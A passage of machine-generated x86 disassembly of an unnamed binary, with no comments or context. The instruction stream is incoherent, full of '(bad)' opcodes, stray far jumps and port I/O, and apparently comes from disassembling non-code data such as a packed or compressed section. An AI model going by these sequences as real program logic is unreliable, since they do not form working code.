  4236cb:	fcomp  DWORD PTR [ebp+0x0]
	...
  4236da:	shl    BYTE PTR [edx],cl
  4236dc:	xchg   esi,eax
  4236dd:	call   0xe61:0x6adebef6
  4236e4:	cmp    DWORD PTR [eax],esi
  4236e6:	pop    edx
  4236e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4236e8:	stc    
  4236e9:	outs   dx,DWORD PTR ds:[esi]
  4236ea:	xchg   ebp,eax
  4236eb:	mov    al,0x1
  4236ed:	add    bl,bh
  4236ef:	add    DWORD PTR [eax],eax
  4236f1:	add    cl,ah
  4236f3:	push   ds
  4236f4:	dec    edi
  4236f5:	retf   
  4236f6:	dec    eax
  4236f7:	retf   
  4236f8:	jbe    0x4236f5
  4236fa:	loope  0x423755
  4236fc:	test   BYTE PTR [edi],dh
  4236fe:	mov    dh,0x7a
  423700:	aad    0xf0
  423702:	xlat   BYTE PTR ds:[ebx]
  423703:	mov    esi,0xe97a2ef8
  423708:	mov    esp,0xb83d4cb
  42370d:	mov    edi,0x53c83c79
  423712:	push   eax
  423713:	rcl    BYTE PTR [eax],1
  423715:	repz fiadd DWORD PTR [esi+eiz*1+0x12661680]
  42371d:	add    al,0x97
  42371f:	rcr    DWORD PTR [esi],1
  423721:	or     DWORD PTR [ecx+0x6a],ebx
  423724:	xchg   esp,eax
  423725:	stos   BYTE PTR es:[edi],al
  423726:	and    DWORD PTR [eax-0x26ae3d54],esi
  42372c:	inc    esi
  42372d:	scas   eax,DWORD PTR es:[edi]
  42372e:	add    ecx,esi
  423730:	jmp    0x4236d2
  423732:	sbb    al,0x18
  423734:	outs   dx,BYTE PTR ds:[esi]
  423735:	sbb    DWORD PTR [ebx-0x42],0xad9e8d5e
  42373c:	sbb    eax,0xe0462049
  423741:	or     eax,0xa07a3d00
  423746:	push   cs
  423747:	repz pop esi
  423749:	int    0xdc
  42374b:	js     0x4236ef
  42374d:	jb     0x4237c4
  42374f:	and    eax,0x480fc49f
  423754:	pop    es
  423755:	bound  ecx,QWORD PTR [edi-0x7e219d35]
  42375b:	pusha  
  42375c:	jo     0x423708
  42375e:	repz mov al,0x40
  423761:	and    al,0x3d
  423763:	pop    ebp
  423764:	lock mov bl,0x84
  423767:	clc    
  423768:	sti    
  423769:	aaa    
  42376a:	std    
  42376b:	not    DWORD PTR [ecx+0x46]
  42376e:	int3   
  42376f:	pushf  
  423770:	mov    ch,0x4a
  423772:	daa    
  423773:	fdivr  QWORD PTR [edx]
  423775:	pop    esp
  423776:	fwait
  423777:	pop    ss
  423778:	push   es
  423779:	loopne 0x42374f
  42377b:	gs iret 
  42377d:	shr    DWORD PTR [eax],0xf
  423780:	xor    eax,0x5f43dd7b
  423785:	inc    ecx
  423786:	retf   
  423787:	xchg   esp,eax
  423788:	pop    ecx
  42378a:	xor    ebx,DWORD PTR [ecx+0x10e3f519]
  423790:	dec    ebp
  423791:	imul   ebx,DWORD PTR [ecx+0x6b],0xffffff98
  423795:	cdq    
  423796:	xchg   edx,eax
  423797:	mov    eax,0xa100967a
  42379c:	cdq    
  42379d:	xchg   edx,eax
  42379e:	addr16 ret 
  4237a0:	add    al,BYTE PTR [ecx]
  4237a2:	sub    ch,ch
  4237a4:	add    ebx,0x2cc3b17a
  4237aa:	inc    ebx
  4237ab:	add    edi,DWORD PTR [esi]
  4237ad:	shr    ah,1
  4237af:	cli    
  4237b0:	push   ds
  4237b1:	jg     0x4237e7
  4237b3:	cli    
  4237b4:	fimul  DWORD PTR [eax-0x8f8451b]
  4237ba:	mov    edx,0x32b1df9d
  4237bf:	scas   eax,DWORD PTR es:[edi]
  4237c0:	jge    0x42380a
  4237c2:	data16 into 
  4237c4:	sar    BYTE PTR [eax],1
  4237c6:	cmp    al,0xac
  4237c8:	mov    ebp,0x40608e0e
  4237cd:	adc    edi,esi
  4237cf:	push   0xffffff98
  4237d1:	lock mov esp,0xcacc90a6
  4237d7:	mul    ah
  4237d9:	sub    eax,0xaea6136f
  4237de:	xor    eax,0x42ad857e
  4237e3:	in     al,0xb8
  4237e5:	cld    
  4237e6:	jne    0x42380e
  4237e8:	ss ins BYTE PTR es:[edi],dx
  4237ea:	jno    0x4237f6
  4237ec:	repnz sar DWORD PTR [ebx],0x25
  4237f0:	(bad)  
  4237f1:	push   edi
  4237f2:	ins    DWORD PTR es:[edi],dx
  4237f3:	sbb    DWORD PTR [edx],esp
  4237f5:	nop
  4237f6:	jge    0x423863
  4237f8:	daa    
  4237f9:	lds    edx,FWORD PTR [ebx+0x48a9c6ea]
  4237ff:	xlat   BYTE PTR ds:[ebx]
  423800:	xchg   edi,eax
  423801:	aas    
  423802:	mov    ch,0xd3
  423804:	ds mov edx,0xa03ee2c4
  42380a:	mov    edi,0x3e7edbe8
  42380f:	outs   dx,BYTE PTR ds:[esi]
  423810:	(bad)  
  423811:	into   
  423812:	std    
  423813:	or     al,0x55
  423815:	std    
  423816:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423817:	loopne 0x423851
  423819:	inc    esi
  42381a:	xor    al,0x66
  42381c:	icebp  
  42381d:	push   cs
  42381e:	mov    ch,0x9
  423820:	lock xor DWORD PTR [eax+0x7b],edi
  423824:	(bad)  
  423825:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423826:	clc    
  423827:	ins    BYTE PTR es:[edi],dx
  423828:	sub    eax,0x8b4af6e0
  42382d:	mov    esp,edx
  42382f:	stos   BYTE PTR es:[edi],al
  423830:	sbb    DWORD PTR [edx],0x51
  423833:	mov    eax,0x684694
  423838:	lds    eax,FWORD PTR [ebp-0x2a]
  42383b:	and    bh,BYTE PTR [edi-0x45c43726]
  423841:	inc    edi
  423842:	jp     0x423819
  423844:	retf   0x30f9
  423847:	xor    cl,BYTE PTR [ebx]
  423849:	aad    0xbe
  42384b:	xchg   edi,eax
  42384c:	fisub  DWORD PTR [edi+0x41]
  42384f:	fidivr WORD PTR [ecx]
  423851:	int3   
  423852:	(bad)  
  423853:	out    dx,eax
  423854:	mov    bl,0x23
  423856:	mov    ebp,0x8a0b5ff3
  42385b:	sbb    bl,BYTE PTR [eax+0x14]
  42385e:	scas   al,BYTE PTR es:[edi]
  42385f:	(bad)  
  423860:	fstp   TBYTE PTR [eax+0x19e4d704]
  423866:	outs   dx,DWORD PTR ds:[esi]
  423867:	lock shl esi,0x6b
  42386b:	xor    cl,BYTE PTR [edi-0x32]
  42386e:	imul   ebp,DWORD PTR [ecx+0x53],0xffffffda
  423872:	and    bh,cl
  423874:	and    eax,0xff8dce87
  423879:	and    eax,0x33881b12
  42387e:	mov    al,0xc5
  423880:	fcom   DWORD PTR [eax+0x1a]
  423883:	add    BYTE PTR [ecx+0x7dcbb8aa],dl
  423889:	adc    al,0xff
  42388b:	loop   0x4238eb
  42388d:	sbb    bl,ah
  42388f:	je     0x423871
  423891:	outs   dx,BYTE PTR ds:[esi]
  423892:	leave  
  423893:	adc    ecx,0x95fc59b4
  423899:	inc    ecx
  42389a:	inc    ecx
  42389b:	xor    BYTE PTR [ebx+0x3c],ch
  42389e:	fmul   QWORD PTR [ecx+0x27]
  4238a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4238a2:	push   ecx
  4238a3:	mov    ebx,0x707351b2
  4238a8:	cmp    eax,0x646f93a7
  4238ad:	pushf  
  4238ae:	fisttp QWORD PTR [ebp-0x22b0ad21]
  4238b4:	sub    DWORD PTR [edi+esi*4],ebp
  4238b7:	mov    eax,ds:0xa0f2f189
  4238bc:	imul   edx,DWORD PTR [ebx],0x7f
  4238bf:	push   es
  4238c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4238c1:	ret    
  4238c2:	jg     0x423922
  4238c4:	(bad)  
  4238c5:	out    dx,eax
  4238c6:	shl    BYTE PTR [edi],cl
  4238c8:	das    
  4238c9:	push   eax
  4238ca:	mov    ds:0x5ec5efb2,al
  4238cf:	aam    0x9f
  4238d1:	ret    0xf5a0
  4238d4:	inc    ebx
  4238d5:	cdq    
  4238d6:	mov    bl,dl
  4238d8:	data16 out 0xd9,al
  4238db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4238dc:	add    ch,BYTE PTR [eax+0x30357ba4]
  4238e2:	nop
  4238e3:	cld    
  4238e4:	(bad)  
  4238e5:	jle    0x4238bf
  4238e7:	and    DWORD PTR [eax+0x2e06176b],edi
	...
  4238f9:	add    ch,bl
  4238fb:	cmp    al,0x8f
  4238fd:	mov    esp,0x7dffbfef
  423902:	in     al,dx
  423903:	outs   dx,BYTE PTR ds:[esi]
  423904:	fs push esp
  423906:	cmp    edi,DWORD PTR [ecx-0x14]
  423909:	cdq    
  42390a:	nop
  42390b:	mov    dl,0x1
  42390d:	add    bl,bh
  42390f:	add    DWORD PTR [eax],eax
  423911:	add    BYTE PTR [edx+0x5a87feeb],cl
  423917:	sbb    edx,edx
  423919:	sbb    ebp,0xd5fffbee
  42391f:	mov    edx,0x555b929e
  423924:	lahf   
  423925:	jns    0x42393b
  423927:	dec    edi
  423928:	dec    ebx
  423929:	jno    0x42399b
  42392b:	fwait
  42392c:	add    DWORD PTR [ebx],0x51282785
  423932:	xor    al,al
  423934:	mov    esp,0xa1dead03
  423939:	pop    esp
  42393a:	int    0x2a
  42393c:	sbb    BYTE PTR [esi+edx*1],0x96
  423940:	popf   
  423941:	cmp    eax,0x9d1a7a6c
  423946:	(bad)
  42394a:	movsx  ebx,WORD PTR [esi-0x25bfc33a]
  423951:	inc    DWORD PTR [eax+0x5a]
  423954:	in     eax,dx
  423955:	cmovno ebp,DWORD PTR [edi+0x68]
  423959:	iret   
  42395a:	rcl    esi,cl
  42395c:	cmp    edx,ebp
  42395e:	push   ebp
  42395f:	mov    bl,0x3e
  423961:	ja     0x42399c
  423963:	xchg   ebp,eax
  423964:	or     dl,BYTE PTR [esi+0x37]
  423967:	data16 loopne 0x4238f9
  42396a:	fcomi  st,st(3)
  42396c:	xor    eax,0x2388a06f
  423971:	dec    esi
  423972:	inc    edi
  423973:	lock rcr DWORD PTR [di-0x3c],cl
  423978:	jl     0x42395e
  42397a:	enter  0xc183,0x5e
  42397e:	xchg   BYTE PTR [eiz*2+0x3dafea27],bh
  423985:	gs pushf 
  423987:	(bad)  
  423989:	cwde   
  42398a:	mov    ebx,0xb0526ec0
  42398f:	call   0xc4da3476
  423994:	add    al,0x90
  423996:	jne    0x4239ac
  423998:	cmp    ebx,DWORD PTR [ebp+0xb]
  42399b:	cpuid  
  42399d:	cld    
  42399e:	cmp    BYTE PTR [ebp+0x39],cl
  4239a1:	fdivr  DWORD PTR ds:0x6524036d
  4239a7:	sbb    esp,DWORD PTR [ecx+esi*2+0x4984eb1d]
  4239ae:	out    0x2b,al
  4239b0:	push   0xf6f7d6bb
  4239b5:	and    edi,esi
  4239b7:	enter  0x91a2,0x73
  4239bb:	pop    ebx
  4239bc:	ss (bad) 
  4239be:	cmc    
  4239bf:	cmp    ebp,DWORD PTR [ebx]
  4239c1:	add    BYTE PTR [edi+0x522a25aa],bl
  4239c7:	add    esp,DWORD PTR [ebp-0x6677f828]
  4239cd:	jmp    0x423a3a
  4239cf:	pop    edx
  4239d0:	cs in  eax,dx
  4239d2:	repz push si
  4239d5:	shl    BYTE PTR [ebp+0x9],cl
  4239d8:	pop    edi
  4239d9:	cmp    ebx,eax
  4239db:	ins    BYTE PTR es:[edi],dx
  4239dc:	iret   
  4239dd:	test   eax,0x3d4bb034
  4239e2:	icebp  
  4239e3:	test   al,ah
  4239e5:	add    ch,bh
  4239e7:	jmp    0xc93867b0
  4239ec:	daa    
  4239ed:	pop    edi
  4239ee:	loope  0x423978
  4239f0:	(bad)
  4239f3:	mov    ebp,0xd283bd50
  4239f8:	aas    
  4239f9:	or     edx,edi
  4239fb:	and    dh,BYTE PTR [esi+0x7b612751]
  423a01:	mov    dh,0x9f
  423a03:	mov    esp,0x74af50d7
  423a08:	mov    BYTE PTR [ebx-0x59],0xfa
  423a0c:	int3   
  423a0d:	push   esp
  423a0e:	jns    0x4239e0
  423a10:	shl    DWORD PTR [edi-0x4],0xcd
  423a14:	pop    ebx
  423a15:	jo     0x423a06
  423a17:	retf   0xaad2
  423a1a:	push   es
  423a1b:	inc    ecx
  423a1c:	ins    DWORD PTR es:[edi],dx
  423a1d:	out    0x19,al
  423a1f:	sbb    BYTE PTR ds:0xd817055,cl
  423a25:	sub    eax,0xf9ac125
  423a2a:	add    eax,0x5f6a1651
  423a2f:	ins    DWORD PTR es:[edi],dx
  423a30:	ins    DWORD PTR es:[edi],dx
  423a31:	and    esi,DWORD PTR [ecx-0x6]
  423a34:	adc    BYTE PTR [edx],ah
  423a36:	xchg   ecx,eax
  423a37:	retf   
  423a38:	stos   DWORD PTR es:[edi],eax
  423a39:	xlat   BYTE PTR ds:[ebx]
  423a3a:	mov    cl,0xf0
  423a3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a3d:	cmp    ebp,ebp
  423a3f:	mov    al,ds:0x72dedf56
  423a44:	mov    bh,0x38
  423a46:	fsub   DWORD PTR [edx+0x7fc3daa6]
  423a4c:	mov    ecx,0xc39c9f27
  423a51:	sub    dl,dh
  423a53:	js     0x423a3b
  423a55:	sub    DWORD PTR [edx],ecx
  423a57:	sar    BYTE PTR [esi-0x2b779bb1],1
  423a5d:	push   DWORD PTR [ecx-0x21]
  423a60:	push   esp
  423a61:	test   DWORD PTR [eax-0x348e35a5],ebx
  423a67:	fisttp DWORD PTR [eax+0x67]
  423a6b:	pusha  
  423a6c:	jns    0x423a8d
  423a6e:	jp     0x4239ff
  423a70:	popa   
  423a71:	daa    
  423a72:	in     al,dx
  423a73:	add    cl,dl
  423a75:	or     BYTE PTR [ecx+0x20],cl
  423a78:	retf   
  423a79:	push   0xbb7dc565
  423a7e:	add    eax,0x1905ae83
  423a83:	mov    ch,0x59
  423a85:	pusha  
  423a86:	dec    edx
  423a87:	jl     0x423a90
  423a89:	or     esi,DWORD PTR [ecx]
  423a8b:	mov    edi,0x6cccab5b
  423a90:	les    eax,FWORD PTR [ebp-0x3b]
  423a93:	pop    ss
  423a94:	pop    eax
  423a95:	aad    0xc5
  423a97:	jno    0x423a4a
  423a99:	cld    
  423a9a:	outs   dx,DWORD PTR ds:[esi]
  423a9b:	pop    es
  423a9c:	cli    
  423a9d:	pop    es
  423a9e:	mov    bl,BYTE PTR [esi-0x348b4c30]
  423aa4:	fldcw  WORD PTR [esi-0x25cb3de]
  423aaa:	xor    dl,BYTE PTR [edx+0x28]
  423aad:	adc    bl,ch
  423aaf:	xchg   edx,eax
  423ab0:	and    ebp,esi
  423ab2:	es popf 
  423ab4:	ja     0x423adf
  423ab6:	pop    ds
  423ab7:	loopne 0x423af5
  423ab9:	xchg   ebp,eax
  423aba:	into   
  423abb:	mov    ch,0x39
  423abd:	inc    ebx
  423abe:	jnp    0x423b36
  423ac0:	sbb    al,0x77
  423ac2:	int3   
  423ac3:	addr16 pop esp
  423ac5:	jg     0x423ac7
  423ac7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423ac8:	adc    DWORD PTR [esi-0x1c],edi
  423acb:	les    ebp,FWORD PTR [edx]
  423acd:	jne    0x423ae2
  423acf:	jmp    0x423b25
  423ad1:	mov    WORD PTR [edi+0x21315928],cs
  423ad7:	fisubr WORD PTR [ecx+0x1ffd1493]
  423add:	mov    ch,ch
  423adf:	loopne 0x423a85
  423ae1:	mov    dh,0xdb
  423ae3:	mov    esi,DWORD PTR [ebx]
  423ae5:	cmp    DWORD PTR [ecx],eax
  423ae7:	fild   DWORD PTR ds:0xa6f41629
  423aed:	stc    
  423aee:	or     al,0xbc
  423af0:	ret    0xf1f
  423af3:	dec    ebp
  423af4:	add    DWORD PTR [esi+0x33],esi
  423af7:	mov    edi,DWORD PTR [ebp-0x79e36850]
  423afd:	mov    ebp,0x85dbbc47
  423b02:	mov    WORD PTR [ecx],cs
  423b04:	sub    eax,DWORD PTR [ebp+0x1aeca1be]
  423b0a:	mov    esi,0xdecc
	...
  423b17:	add    BYTE PTR [eax],al
  423b19:	add    BYTE PTR [esi-0x4fd6421],dh
  423b1f:	inc    esi
  423b20:	mov    edi,0x261aff
  423b25:	jb     0x423b18
  423b27:	outs   dx,BYTE PTR ds:[esi]
  423b28:	arpl   WORD PTR [ecx-0x75],di
  423b2b:	mov    ah,0x1
  423b2d:	add    bl,bh
  423b2f:	add    DWORD PTR [eax],eax
  423b31:	add    BYTE PTR [edx],ah
  423b33:	xor    BYTE PTR [eax+0x5c],cl
  423b36:	adc    bl,BYTE PTR [eax]
  423b38:	inc    edx
  423b39:	xor    eax,0xcb43d35a
  423b3e:	test   esi,esi
  423b40:	and    al,0xde
  423b42:	inc    eax
  423b43:	aas    
  423b44:	loopne 0x423b9f
  423b46:	xchg   ebx,eax
  423b47:	call   0x1222:0x5435c59d
  423b4e:	or     BYTE PTR [eax-0x4f3e4a14],0xdc
  423b55:	js     0x423b08
  423b57:	lock lea esp,[eax-0x651c486d]
  423b5e:	fmul   QWORD PTR [edi]
  423b60:	pop    ss
  423b61:	aaa    
  423b62:	out    0xbc,al
  423b64:	mov    esp,0xd624cf9b
  423b69:	mov    bl,0x54
  423b6b:	js     0x423b30
  423b6d:	in     al,0x87
  423b6f:	daa    
  423b70:	mov    eax,0xeb286b39
  423b75:	xor    esi,DWORD PTR [esi+0x1a]
  423b78:	ja     0x423b28
  423b7a:	das    
  423b7b:	fadd   QWORD PTR [ebp+eax*8-0x2f]
  423b7f:	pop    ebx
  423b80:	sbb    dl,ah
  423b82:	pop    esp
  423b83:	bound  edx,QWORD PTR [esp+esi*1-0x78]
  423b87:	add    eax,ecx
  423b89:	mov    ss,WORD PTR [ebp+0x52]
  423b8c:	pop    ebp
  423b8d:	lds    ebx,FWORD PTR [eax-0x66a96670]
  423b93:	adc    DWORD PTR [edx+edi*4],esi
  423b96:	fcmovb st,st(1)
  423b98:	clc    
  423b99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b9a:	push   0xbedc4bf9
  423b9f:	jo     0x423c0b
  423ba1:	imul   edi,DWORD PTR [ebx+0x5dbbb5a7],0x7a
  423ba8:	sub    BYTE PTR [ebx-0x26],ch
  423bab:	ret    
  423bac:	mov    ebx,0x83c7ba52
  423bb1:	inc    ebp
  423bb2:	lea    edi,[esi+0x1a094a38]
  423bb8:	mov    esi,0x783773a9
  423bbd:	scas   al,BYTE PTR es:[edi]
  423bbe:	inc    ebp
  423bbf:	dec    ebx
  423bc0:	cs scas eax,DWORD PTR es:[edi]
  423bc2:	lock test eax,0x4a9383ce
  423bc8:	push   esp
  423bc9:	loopne 0x423bcd
  423bcb:	js     0x423b89
  423bcd:	retf   0xec41
  423bd0:	ja     0x423be0
  423bd2:	push   0x4f
  423bd4:	adc    edx,DWORD PTR gs:[ecx+0x6ad4e3c9]
  423bdb:	dec    esp
  423bdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423bdd:	jp     0x423b86
  423bdf:	shl    bl,0x49
  423be2:	cdq    
  423be3:	or     DWORD PTR [eax+0x2f],eax
  423be6:	or     edi,DWORD PTR [eax]
  423be8:	xchg   edx,eax
  423be9:	test   DWORD PTR [ecx-0x4195d0b6],0xa22954a2
  423bf3:	mov    al,ds:0x4cc7a68c
  423bf8:	mov    al,ds:0x8db1e54b
  423bfd:	mov    fs,WORD PTR [ecx+0x17]
  423c00:	push   ebx
  423c01:	and    cl,BYTE PTR [ecx]
  423c03:	pop    ecx
  423c04:	xchg   esi,eax
  423c05:	les    eax,FWORD PTR [edx]
  423c07:	pop    ds
  423c08:	dec    edx
  423c09:	mov    ecx,ebp
  423c0b:	lods   al,BYTE PTR ds:[esi]
  423c0c:	xchg   BYTE PTR [ecx],bl
  423c0e:	jo     0x423b97
  423c10:	or     bl,BYTE PTR [ebx-0x257003c8]
  423c16:	push   edi
  423c17:	outs   dx,BYTE PTR ds:[esi]
  423c18:	dec    edi
  423c19:	xor    eax,0x45eb8bc8
  423c1e:	(bad)  
  423c1f:	cld    
  423c20:	xchg   ebx,eax
  423c21:	aam    0x59
  423c23:	push   ss
  423c24:	ins    BYTE PTR es:[edi],dx
  423c25:	rcl    DWORD PTR [ebp-0x46b61744],1
  423c2b:	cmp    eax,0x29191d23
  423c30:	pop    es
  423c31:	sbb    eax,0xfbd14774
  423c36:	pop    ebx
  423c37:	sub    bl,BYTE PTR [ecx]
  423c39:	sti    
  423c3a:	(bad)  
  423c3b:	loope  0x423c65
  423c3d:	pop    ebx
  423c3e:	out    dx,eax
  423c3f:	cmc    
  423c40:	xchg   ecx,eax
  423c41:	push   ss
  423c42:	mov    esi,0xde4fbc82
  423c47:	stos   BYTE PTR es:[edi],al
  423c48:	(bad)  
  423c49:	pop    esi
  423c4a:	sbb    BYTE PTR [eax+edx*2-0x22],cl
  423c4e:	cmp    eax,0xe2e68aa7
  423c53:	out    0x76,al
  423c55:	push   eax
  423c56:	loop   0x423c25
  423c58:	inc    ebp
  423c59:	sbb    al,0x4e
  423c5b:	xchg   esp,eax
  423c5c:	sbb    eax,0xc7742e7b
  423c61:	retf   0xf56d
  423c64:	daa    
  423c65:	out    dx,eax
  423c66:	xchg   ebx,eax
  423c67:	sar    al,0xb9
  423c6a:	out    0x4b,al
  423c6c:	aam    0x7f
  423c6e:	call   0x4e2f:0x6a155c13
  423c75:	jno    0x423ccf
  423c77:	adc    BYTE PTR [ecx+0x1592bbe1],dh
  423c7d:	test   DWORD PTR [ecx],0x7429ffd
  423c83:	popf   
  423c84:	xchg   ecx,eax
  423c85:	dec    ecx
  423c86:	sahf   
  423c87:	and    BYTE PTR [ecx+0x72412a14],ch
  423c8d:	sub    bl,dh
  423c8f:	mov    bl,0x2e
  423c91:	pop    esi
  423c92:	adc    BYTE PTR [ecx],dh
  423c94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423c95:	repnz fsubr QWORD PTR [eax]
  423c98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423c99:	bound  ebx,QWORD PTR [edx+0x74]
  423c9c:	adc    ebx,DWORD PTR [esi+0x1e]
  423c9f:	jno    0x423d0a
  423ca1:	lahf   
  423ca2:	icebp  
  423ca3:	test   al,0xa7
  423ca5:	mov    ds:0x59028898,eax
  423caa:	inc    eax
  423cab:	lods   al,BYTE PTR ds:[esi]
  423cac:	pop    eax
  423cad:	add    esp,ebp
  423caf:	sbb    BYTE PTR [ebp+0x7886f45f],al
  423cb5:	cmp    BYTE PTR [esi+0x21834e],bl
  423cbb:	std    
  423cbc:	xchg   ecx,eax
  423cbd:	mov    ecx,0x144de530
  423cc2:	push   edi
  423cc3:	mov    DWORD PTR [edi+0x65],ebp
  423cc6:	or     al,0xe2
  423cc8:	test   BYTE PTR [eax],dl
  423cca:	mov    ch,0x80
  423ccc:	pop    ds
  423ccd:	jg     0x423d20
  423ccf:	mov    dh,0x74
  423cd1:	mov    ebp,0x439a64b3
  423cd6:	pop    ebx
  423cd7:	test   eax,0xa2dea9f7
  423cdc:	cmp    al,0x50
  423cde:	dec    ebp
  423cdf:	mov    bh,0xce
  423ce1:	ins    BYTE PTR es:[edi],dx
  423ce2:	inc    ecx
  423ce3:	xlat   BYTE PTR ds:[ebx]
  423ce4:	shl    BYTE PTR [eax+0x57],0x5e
  423ce8:	lds    ebp,FWORD PTR [ebp+0x2d]
  423ceb:	mov    ds:0xcc24a886,al
  423cf0:	cmp    bh,BYTE PTR [ebx-0x79]
  423cf3:	xor    eax,0x1c5f97c3
  423cf8:	jg     0x423cd6
  423cfa:	sub    dl,BYTE PTR [ebp-0x78]
  423cfd:	aas    
  423cfe:	das    
  423cff:	pop    edi
  423d00:	add    esi,DWORD PTR [esi-0x60]
  423d03:	dec    edi
  423d04:	adc    al,0xe1
  423d06:	inc    eax
  423d07:	xchg   BYTE PTR [esi+0x793534a1],dl
  423d0d:	xor    ch,ch
  423d0f:	sbb    al,0xd1
  423d11:	pop    eax
  423d12:	mov    eax,ds:0x84372a70
  423d17:	repnz fadd DWORD PTR [edi+0x27]
  423d1b:	cmp    BYTE PTR [eax-0x2acac7fb],cl
  423d21:	mov    edx,0x3181edd
  423d26:	push   ds
  423d27:	mov    edi,0xe50c4304
  423d2c:	add    BYTE PTR [eax],0x0
	...
  423d37:	add    BYTE PTR [eax],al
  423d39:	add    al,bh
  423d3b:	mov    ah,0x7f
  423d3d:	cmp    eax,0xf5faff7f
  423d42:	mov    edx,0xd657ffb2
  423d47:	in     eax,dx
  423d48:	mov    cl,BYTE PTR ds:0x1b686
  423d4e:	sti    
  423d4f:	add    DWORD PTR [eax],eax
  423d51:	add    BYTE PTR [eax],ch
  423d53:	adc    bh,BYTE PTR [edi+ecx*8-0x60]
  423d57:	jecxz  0x423db2
  423d59:	lods   al,BYTE PTR ds:[esi]
  423d5a:	jmp    0x8e4b:0x340c3a6b
  423d61:	sbb    BYTE PTR es:[edi+ebp*4],0x84
  423d66:	jge    0x423d76
  423d68:	loope  0x423d92
  423d6a:	xor    edi,esi
  423d6c:	sbb    BYTE PTR [ecx],dh
  423d6e:	je     0x423d79
  423d70:	mov    esp,DWORD PTR [edi+0x48]
  423d73:	and    esi,DWORD PTR [edi-0x4f]
  423d76:	hlt    
  423d77:	add    eax,0xdb58fde3
  423d7c:	clc    
  423d7d:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  423d7f:	dec    ecx
  423d80:	sub    BYTE PTR [ebx],bh
  423d82:	int    0x16
  423d84:	scas   eax,DWORD PTR es:[edi]
  423d85:	inc    ebx
  423d86:	enter  0x6b53,0x7f
  423d8a:	in     al,0x43
  423d8c:	(bad)  
  423d8d:	(bad)  
  423d8e:	sahf   
  423d8f:	imul   ebp,DWORD PTR [ebx],0xffffffb2
  423d92:	neg    BYTE PTR [edx]
  423d94:	mov    ds,WORD PTR [ecx+0x3]
  423d97:	iret   
  423d98:	cmp    eax,0x91ed0d28
  423d9d:	aam    0xc3
  423d9f:	(bad)  
  423da1:	and    al,0x54
  423da3:	aaa    
  423da4:	imul   edi,DWORD PTR [esi],0x2ec7ac5a
  423daa:	lock out 0xb2,eax
  423dad:	inc    eax
  423dae:	ret    
  423daf:	jg     0x423da8
  423db1:	or     bh,ch
  423db3:	dec    edi
  423db4:	lahf   
  423db5:	push   ebp
  423db6:	dec    edx
  423db7:	imul   ecx,DWORD PTR [esi],0xffffffd0
  423dba:	dec    ebx
  423dbb:	inc    edx
  423dbc:	icebp  
  423dbd:	mov    al,ds:0x4b7a2efd
  423dc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423dc3:	jno    0x423db2
  423dc5:	mov    ah,0x90
  423dc7:	ret    0x66a8
  423dca:	in     eax,0xd2
  423dcc:	cmp    DWORD PTR [ebx-0x70],edx
  423dcf:	add    cl,BYTE PTR [esi+0x729133e7]
  423dd5:	mov    eax,0xdb44a39f
  423dda:	add    DWORD PTR [eax+0x65],eax
  423ddd:	push   ecx
  423dde:	enter  0x67ea,0x58
  423de2:	loope  0x423d7e
  423de4:	dec    ebp
  423de5:	jno    0x423e4a
  423de7:	(bad)  
  423de8:	or     BYTE PTR [esi],al
  423dea:	sub    al,0xf0
  423dec:	xor    eax,0xa5e1c8e7
  423df1:	inc    ebx
  423df2:	jae    0x423db0
  423df4:	adc    cl,BYTE PTR [edx]
  423df6:	lods   al,BYTE PTR ds:[esi]
  423df7:	div    DWORD PTR [ebp+0x6a5366be]
  423dfd:	inc    edi
  423dfe:	rol    DWORD PTR ds:0xaea06c16,0x8c
  423e05:	out    dx,al
  423e06:	stc    
  423e07:	mov    al,ds:0x304fa5ed
  423e0c:	iret   
  423e0d:	jmp    0xe463:0x4e56d5a
  423e14:	test   BYTE PTR [ecx+0x7fbf1398],cl
  423e1a:	in     al,dx
  423e1b:	push   ebx
  423e1c:	xchg   esi,eax
  423e1d:	loopne 0x423ddd
  423e1f:	fimul  WORD PTR [ebp+0x1e]
  423e22:	daa    
  423e23:	icebp  
  423e24:	inc    ebp
  423e25:	dec    ebp
  423e26:	jmp    FWORD PTR [esi]
  423e28:	add    DWORD PTR [ebx-0x705d5e65],esi
  423e2e:	pop    ecx
  423e2f:	jle    0x423dc7
  423e31:	sbb    al,0x91
  423e33:	xor    BYTE PTR [ebp-0x1aaebf5b],0x5c
  423e3a:	ins    BYTE PTR es:[edi],dx
  423e3b:	xor    al,0xa7
  423e3d:	(bad)  [edx+0x310c3060]
  423e43:	push   es
  423e44:	jp     0x423eb2
  423e46:	test   DWORD PTR [ebp-0xf],edi
  423e49:	ins    DWORD PTR es:[edi],dx
  423e4a:	xchg   edx,eax
  423e4b:	mov    esi,0xc6dfa0db
  423e50:	add    BYTE PTR [ebp+0x4d],bh
  423e53:	scas   al,BYTE PTR es:[edi]
  423e54:	popf   
  423e55:	push   0xffffff90
  423e57:	retf   
  423e58:	xchg   DWORD PTR [ebx-0x273641cb],ebx
  423e5e:	cwde   
  423e5f:	dec    ebp
  423e60:	mov    bh,BYTE PTR [edi-0x28041794]
  423e66:	scas   eax,DWORD PTR es:[edi]
  423e67:	and    DWORD PTR [edx+0x5c],ecx
  423e6a:	pop    edx
  423e6b:	stos   BYTE PTR es:[edi],al
  423e6c:	in     eax,0x5f
  423e6e:	idiv   DWORD PTR [eax-0x6fadd1ee]
  423e74:	mov    esi,0xcd901241
  423e79:	xchg   esp,eax
  423e7a:	scas   al,BYTE PTR es:[edi]
  423e7b:	imul   esp,DWORD PTR [esi],0x5f
  423e7e:	push   eax
  423e7f:	jl     0x423e4d
  423e81:	sub    al,0x22
  423e83:	adc    ebp,DWORD PTR [esi+edi*8]
  423e86:	mov    bl,0x8f
